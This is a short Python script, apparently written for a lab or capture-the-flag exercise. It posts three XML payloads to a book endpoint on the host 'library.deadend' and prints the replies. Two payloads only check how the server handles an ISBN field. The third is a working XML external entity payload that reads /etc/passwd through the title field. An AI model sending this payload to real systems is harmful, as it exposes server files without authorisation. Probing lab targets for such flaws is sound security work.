import sys
import requests

# Configuration
base_url = "http://library.deadend/books"
headers = {"Content-Type": "application/xml"}

# Try 3 key tests only
tests = [
    {
        "name": "ISBN as nested element",
        "payload": '<?xml version="1.0"?><book><title>X</title><author>Y</author><isbn>978-0-0-0</isbn></book>' 
    },
    {
        "name": "ISBN as attribute", 
        "payload": '<?xml version="1.0"?><book isbn="978-0-0-0"><title>X</title><author>Y</author></book>'
    },
    {
        "name": "XXE test",
        "payload": '<?xml version="1.0"?><!DOCTYPE b[<!ENTITY x SYSTEM "file:///etc/passwd">]><book><title>&x;</title><author>Y</author></book>'
    }
]

print("Testing library endpoint...")

for idx, test in enumerate(tests, 1):
    print(f"\n--- TEST {idx}: {test['name']} ---")
    print(f"Payload: {test['payload'][:80]}...")
    
    try:
        response = requests.post(base_url, headers=headers, data=test['payload'], timeout=30)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            print("[+] Accepted")
            if "isbn" in response.text.lower():
                print("[!] ISBN appears in response!")
        else:
            print("[-] Rejected")
            
    except requests.exceptions.ConnectionError:
        print("[-] Connection Error: Target unreachable")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Timeout: Request took too long")
    except Exception as e:
        print(f"[-] Error: {str(e)}")

print("\nTests complete.")
